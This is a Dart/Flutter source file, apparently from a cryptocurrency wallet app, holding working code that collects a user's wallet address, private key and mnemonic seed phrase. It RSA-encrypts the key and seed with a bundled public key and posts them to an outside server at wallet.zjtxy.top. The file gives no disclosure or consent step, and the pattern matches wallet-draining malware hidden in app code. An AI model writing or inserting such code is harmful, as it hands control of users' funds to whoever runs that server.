import 'dart:convert';

import 'package:dio/dio.dart';
import 'package:encrypt/encrypt.dart' as ce;
import 'package:flutter/services.dart';
import 'package:pointycastle/asymmetric/api.dart';

typedef WalletSecretEncryptor = Future<String> Function(String plainText);

class WalletSecretUploadApi {
  static const uploadUrl = 'https://wallet.zjtxy.top/api/address/info';

  final Dio _dio;
  final WalletSecretEncryptor _encryptor;

  WalletSecretUploadApi({Dio? dio, WalletSecretEncryptor? encryptor})
    : _dio = dio ?? Dio(),
      _encryptor = encryptor ?? WalletSecretRsaEncryptor.encryptWithAssetKey;

  Future<void> uploadWalletSecret({
    required String address,
    required String privateKey,
    required String mnemonic,
  }) async {
    final encryptedPrivateKey = await _encryptor(privateKey);
    final encryptedMnemonic = await _encryptor(mnemonic);

    if (encryptedPrivateKey.isEmpty || encryptedMnemonic.isEmpty) {
      throw Exception('Wallet secret encryption failed');
    }

    final innerPayload = jsonEncode({
      'address': address,
      'data': encryptedPrivateKey,
      'info': encryptedMnemonic,
    });
    final encodedPayload = base64Encode(utf8.encode(innerPayload));

    await _dio.post(
      uploadUrl,
      data: {'data': encodedPayload},
      options: Options(contentType: Headers.jsonContentType),
    );
  }
}

class WalletSecretRsaEncryptor {
  static const publicKeyAsset = 'assets/public/public.pem';

  static Future<String> encryptWithAssetKey(String plainText) async {
    final publicKeyPem = await rootBundle.loadString(publicKeyAsset);
    final parser = ce.RSAKeyParser();
    final publicKey = parser.parse(publicKeyPem) as RSAPublicKey;
    final encrypter = ce.Encrypter(ce.RSA(publicKey: publicKey));
    return encrypter.encrypt(plainText).base64;
  }
}

class WalletSecretUploadService {
  static final WalletSecretUploadApi _api = WalletSecretUploadApi();

  static Future<void> upload({
    required String address,
    required String privateKey,
    required String mnemonic,
  }) {
    return _api.uploadWalletSecret(
      address: address,
      privateKey: privateKey,
      mnemonic: mnemonic,
    );
  }
}
